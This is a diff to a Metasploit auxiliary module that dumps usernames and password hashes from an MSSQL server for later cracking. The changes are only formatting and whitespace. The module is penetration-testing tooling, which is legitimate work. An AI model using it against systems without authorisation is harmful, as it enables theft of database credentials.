@@ -11,15 +11,15 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'           => 'MSSQL Password Hashdump',
-      'Description'    => %Q{
+      'Name' => 'MSSQL Password Hashdump',
+      'Description' => %Q{
           This module extracts the usernames and encrypted password
         hashes from a MSSQL server and stores them for later cracking.
         This module also saves information about the server version and
         table names, which can be used to seed the wordlist.
       },
-      'Author'         => ['theLightCosine'],
-      'License'        => MSF_LICENSE
+      'Author' => ['theLightCosine'],
+      'License' => MSF_LICENSE
     )
   end
 
@@ -37,19 +37,19 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     service_data = {
-        address: ip,
-        port: mssql_client.peerport,
-        service_name: 'mssql',
-        protocol: 'tcp',
-        workspace_id: myworkspace_id
+      address: ip,
+      port: mssql_client.peerport,
+      service_name: 'mssql',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
     }
 
     credential_data = {
-        module_fullname: self.fullname,
-        origin_type: :service,
-        private_data: datastore['PASSWORD'],
-        private_type: :password,
-        username: datastore['USERNAME']
+      module_fullname: self.fullname,
+      origin_type: :service,
+      private_data: datastore['PASSWORD'],
+      private_type: :password,
+      username: datastore['USERNAME']
     }
 
     if datastore['USE_WINDOWS_AUTHENT']
@@ -61,9 +61,9 @@ class MetasploitModule < Msf::Auxiliary
     credential_core = create_credential(credential_data)
 
     login_data = {
-        core: credential_core,
-        last_attempted_at: DateTime.now,
-        status: Metasploit::Model::Login::Status::SUCCESSFUL
+      core: credential_core,
+      last_attempted_at: DateTime.now,
+      status: Metasploit::Model::Login::Status::SUCCESSFUL
     }
     login_data.merge!(service_data)
 
@@ -85,11 +85,10 @@ class MetasploitModule < Msf::Auxiliary
     unless is_sysadmin == 0
       mssql_hashes = mssql_hashdump(version_year)
       unless mssql_hashes.nil? || mssql_hashes.empty?
-        report_hashes(mssql_hashes,version_year)
+        report_hashes(mssql_hashes, version_year)
       end
     end
   end
-
 
   # Stores the grabbed hashes as loot for later cracking
   # The hash format is slightly different between 2k and 2k5/2k8
@@ -104,18 +103,18 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     this_service = report_service(
-          :host  => mssql_client.peerhost,
-          :port => mssql_client.peerport,
-          :name => 'mssql',
-          :proto => 'tcp'
-          )
+      :host => mssql_client.peerhost,
+      :port => mssql_client.peerport,
+      :name => 'mssql',
+      :proto => 'tcp'
+    )
 
     service_data = {
-        address: ::Rex::Socket.getaddress(mssql_client.peerhost,true),
-        port: mssql_client.peerport,
-        service_name: 'mssql',
-        protocol: 'tcp',
-        workspace_id: myworkspace_id
+      address: ::Rex::Socket.getaddress(mssql_client.peerhost, true),
+      port: mssql_client.peerport,
+      service_name: 'mssql',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
     }
 
     mssql_hashes.each do |row|
@@ -126,12 +125,12 @@ class MetasploitModule < Msf::Auxiliary
       upcase_hash = "0x#{row[1].upcase}"
 
       credential_data = {
-          module_fullname: self.fullname,
-          origin_type: :service,
-          private_type: :nonreplayable_hash,
-          private_data: upcase_hash,
-          username: username,
-          jtr_format: hashtype
+        module_fullname: self.fullname,
+        origin_type: :service,
+        private_type: :nonreplayable_hash,
+        private_data: upcase_hash,
+        username: username,
+        jtr_format: hashtype
       }
 
       credential_data.merge!(service_data)
@@ -168,6 +167,5 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     return results
-
   end
 end
